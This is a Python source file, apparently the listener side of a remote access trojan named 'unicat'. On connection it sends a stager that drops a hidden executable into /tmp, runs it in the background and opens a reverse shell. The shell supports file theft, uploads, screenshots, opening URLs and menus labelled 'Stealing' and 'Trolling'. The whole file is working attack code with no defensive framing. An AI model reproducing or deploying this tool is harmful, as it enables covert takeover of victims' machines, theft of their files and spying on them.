#!/usr/bin/env python3

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'
G = '\033[1;34m[*] \033[0m'

GREEN = '\033[0;33m'
RESET = '\033[0m'

import socket
import struct
import sys
import os

from datetime import datetime

black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot']

if len(sys.argv) != 3:
    print("Usage: unicat.py <local_host> <local_port>")
    sys.exit()

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

def craft_payload(LHOST, LPORT):
    print(G+"Sending payload...")
    f = open("data/payload/magic_unicorn.py", "rb")
    payload = f.read()
    f.close()
    instructions = \
    "cat >/tmp/.magic_unicorn;"+\
    "chmod +x /tmp/.magic_unicorn;"+\
    "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
    print(G+"Executing payload...")
    return (instructions,payload)

class handler:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        payloaded_packet = struct.pack('>I', len(data)) + data
        self.sock.sendall(payloaded_packet)
    def recv(self):
        payloaded_packet_length = self.recvall(4)
        if not payloaded_packet_length: return ""
        payloaded_packet_length = struct.unpack('>I', payloaded_packet_length)[0]
        return self.recvall(payloaded_packet_length)
    def recvall(self, n):
        payloaded_packet = "".encode("UTF-8")
        while len(payloaded_packet) < n:
            frame = self.sock.recv(n - len(payloaded_packet))
            if not frame:
                return None
            payloaded_packet += frame
        return payloaded_packet

def help():
    print("")
    print("Core Commands")
    print("=============")
    os.system("cat data/cmds/unicat_core_cmds.txt")
    print("")
    print("Settings Commands")
    print("=================")
    os.system("cat data/cmds/unicat_settings_cmds.txt")
    print("")
    print("Managing Commands")
    print("=================")
    os.system("cat data/cmds/unicat_managing_cmds.txt")
    print("")
    print("Stealing Commands")
    print("=================")
    os.system("cat data/cmds/unicat_stealing_cmds.txt")
    print("")
    print("Trolling Commands")
    print("=================")
    os.system("cat data/cmds/unicat_trolling_cmds.txt")
    print("")
    print("Local Commands")
    print("==============")
    os.system("cat data/cmds/unicat_local_cmds.txt")
    print("")

def screenshot(output_filename):
    print(G+"Taking screenshot...")
    unicorn.send("screenshot".encode("UTF-8"))
    image = unicorn.recv()
    f = open(output_filename, "wb")
    print(G+"Saving to "+output_filename+"...")
    f.write(image)
    f.close()
    print(S+"Saved to "+output_filename+"...")

def download(input_file):
    command = input_file
    input_file = "".join(input_file.split("download")).strip()
    if input_file.strip():
        output_filename = input_file.split("/")[-1] if "/" in input_file else input_file.split("\\")[-1] if "\\" in input_file else input_file
        unicorn.send(command.encode("UTF-8"))
        down = unicorn.recv().decode("UTF-8", "ignore")
        if down == "true":
            print(G+"Downloading {}...".format(output_filename))
            wf = open(output_filename, "wb")
            while True:
                data = unicorn.recv()
                if data == b"success":
                    break
                elif data == b"fail":
                    wf.close()
                    os.remove(output_filename)
                    print(E+"Failed to download!")
                    return
                wf.write(data)
            print(G+"Saving to {}...".format(os.getcwd()+os.sep+output_filename))
            wf.close()
            print(S+"Saved to {}!".format(os.getcwd()+os.sep+output_filename))
        else:
            print(down)
    else:
        pass

def upload(command):
    output_file = "".join(command.split("upload")).strip()
    if not output_file.strip():
        pass
    else:
       if not os.path.isfile(output_file):
           print(E+"Local file: "+output_file+": does not exist!")
       else:
           unicorn.send(command.encode("UTF-8"))
           print(G+"Uploading {}...".format(output_file))
           with open(output_file,"rb") as wf:
               for data in iter(lambda: wf.read(4100), b""):
                   try:
                       unicorn.send(data)
                   except(KeyboardInterrupt,EOFError):
                       wf.close()
                       unicorn.send("fail".encode("UTF-8"))
                       print(E+"Failed to upload!")
                       return
           unicorn.send("success".encode("UTF-8"))
           savedpath = unicorn.recv().decode("UTF-8")
           print(G+"Saving to " + str(savedpath).strip() + "...")
           print(S+"Saved to "+str(savedpath).strip()+"!")

def openurl(command):
    url = "".join(command.split("openurl")).strip()
    if not url.strip():
        print("Usage: openurl <url>")
    else:
        if not url.startswith(("http://","https://")):
            url = "http://"+url
        unicorn.send("openurl {}".format(url).encode("UTF-8"))

def get_prompt_information():
    unicorn.send("username".encode("UTF-8"))
    username = unicorn.recv()
    unicorn.send("hostname".encode("UTF-8"))
    name = unicorn.recv()
    return (username.decode("UTF-8", "ignore"), name.decode("UTF-8", "ignore"))

def shell():
    while True:
        try:
            username, name = get_prompt_information()
            command = str(input("({}{}@{}{})> ".format(GREEN, username, name, RESET)))
            while not command.strip():
                command = str(input("({}{}@{}{})> ".format(GREEN, username, name, RESET)))
            command = command.strip()
            ui = command.split(" ")
            if ui[0] == "help":
                help()
            elif ui[0] == "download":
                download(command)
            elif ui[0] == "upload":
                upload(command)
            elif ui[0] == "screenshot":
                output_filename = "".join(command.split("screenshot")).strip()
                if not output_filename.strip():
                    print("Usage: screenshot <output_path>")
                else:
                    screenshot(output_filename)
            elif ui[0] == "exit":
                print(G+"Cleaning up...")
                unicorn.send("exit".encode("UTF-8"))
                c.shutdown(2)
                c.close()
                s.close()
                sys.exit()
            elif ui[0] == "exec":
                local_command = "".join(command.split("exec")).strip()
                if not local_command.strip():
                    print("Usage: exec <command>")
                else:
                    print(I+"exec:")
                    os.system(local_command)
                    print("")
            elif ui[0] == "openurl":
                openurl(command)
            elif ui[0] == "clear":
                os.system("clear")
            if not ui[0] in black_list:
                unicorn.send(command.encode("UTF-8"))
                data = unicorn.recv()
                if data.strip():
                    print(data.decode("UTF-8", "ignore"))
        except (KeyboardInterrupt, EOFError):
            print("")
        except socket.error:
            print(E+"Connection refused!")
            c.close()
            s.close()
            sys.exit()
        except UnicodeEncodeError:
            print(data)
            print("")
        except Exception as e:
            print(E+"An error occurred: "+str(e)+"!")

def server(LHOST, LPORT, handler=handler):
    global s, a, c, unicorn
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(1)

    print(G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
    try:
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', LPORT))
        sock.listen(1)
    except:
        print(E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
        sys.exit()

    try:
        print(G + "Listening on port " + str(LPORT) + "...")
        c, a = s.accept()
        print(G + "Connecting to " + a[0] + "...")

        bash_stager, executable = craft_payload(LHOST, LPORT)

        c.send(bash_stager.encode())
        c.send(executable)
        c.close()
        s.close()

        print(G + "Establishing connection...")
        c, a = sock.accept()

        unicorn = handler(c)
        shell()
    except (KeyboardInterrupt, EOFError):
        print("")
        sys.exit()

server(LHOST, LPORT)